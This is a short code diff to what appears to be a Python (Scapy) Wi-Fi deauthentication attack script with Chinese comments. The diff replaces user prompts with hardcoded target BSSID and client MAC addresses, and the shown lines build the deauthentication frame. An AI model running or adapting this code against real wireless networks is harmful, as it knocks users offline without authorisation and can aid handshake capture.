@@ -12,8 +12,8 @@ except ImportError:
 iface = "wlan0"
 
 # 用户输入目标BSSID和客户端MAC地址
-bssid = input("输入目标BSSID: ")
-client_mac = input("输入客户端MAC地址: ")
+bssid = '0A:AF:03:7A:09:6C'
+client_mac = '70:A8:D3:6C:66:3C'
 
 # 创建Deauthentication帧
 dot11 = Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
